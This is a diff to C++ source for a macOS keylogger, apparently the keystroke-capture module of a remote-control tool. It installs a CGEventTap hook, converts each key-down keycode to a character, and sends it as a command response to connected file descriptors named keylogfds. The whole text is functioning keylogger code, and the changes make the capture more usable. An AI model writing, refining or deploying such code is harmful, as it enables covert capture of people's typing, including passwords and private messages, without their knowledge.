@@ -8,7 +8,8 @@
 
 CFRunLoopRef event_loop;
 std::vector<int> keylogfds;
-CFStringRef createStringForKey(CGKeyCode keyCode)
+// only English character is count
+UniChar createStringForKey(CGKeyCode keyCode)
 {
     TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
     CFDataRef layoutData = (CFDataRef)
@@ -23,7 +24,7 @@ CFStringRef createStringForKey(CGKeyCode keyCode)
 
     UCKeyTranslate(keyboardLayout,
                    keyCode,
-                   kUCKeyActionDisplay,
+                   kUCKeyActionDown,
                    0,
                    LMGetKbdType(),
                    kUCKeyTranslateNoDeadKeysBit,
@@ -33,14 +34,16 @@ CFStringRef createStringForKey(CGKeyCode keyCode)
                    chars);
     CFRelease(currentKeyboard);    
 
-    return CFStringCreateWithCharacters(kCFAllocatorDefault, chars, 1);
+    return chars[0];
 }
 CGEventRef hookCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
 {
-    if ((type != kCGEventKeyDown) && (type != kCGEventKeyUp))
+    if ((type != kCGEventKeyDown))
         return event;
     CGKeyCode keycode= (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-    std::string msg((char *)createStringForKey(keycode));
+    char tmp = createStringForKey(keycode);
+    std::string msg;
+    msg.push_back(tmp);
     
     Response res(CMD_RESPONSE_STR, OK_CODE, msg.size() + 1, (void *)msg.c_str());
     
